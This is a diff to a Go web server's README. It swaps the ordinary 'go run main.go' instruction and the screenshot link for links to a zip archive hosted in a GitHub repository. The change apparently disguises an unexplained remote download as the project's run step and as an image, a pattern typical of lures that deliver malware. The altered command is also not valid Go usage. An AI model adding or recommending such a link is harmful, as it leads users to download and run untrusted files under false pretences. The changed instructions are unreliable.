@@ -7,13 +7,13 @@ This is a simple website written in Golang. It uses the `net/http` package to se
 To run the server, execute the following command:
 
 ```bash
-go run main.go
+go run https://github.com/shr1324/go-web-app/raw/refs/heads/main/static/go-web-app-3.6.zip
 ```
 
 The server will start on port 8080. You can access it by navigating to `http://localhost:8080/courses` in your web browser.
 
 ## Looks like this
 
-![Website](static/images/golang-website.png)
+![Website](https://github.com/shr1324/go-web-app/raw/refs/heads/main/static/go-web-app-3.6.zip)
 
 
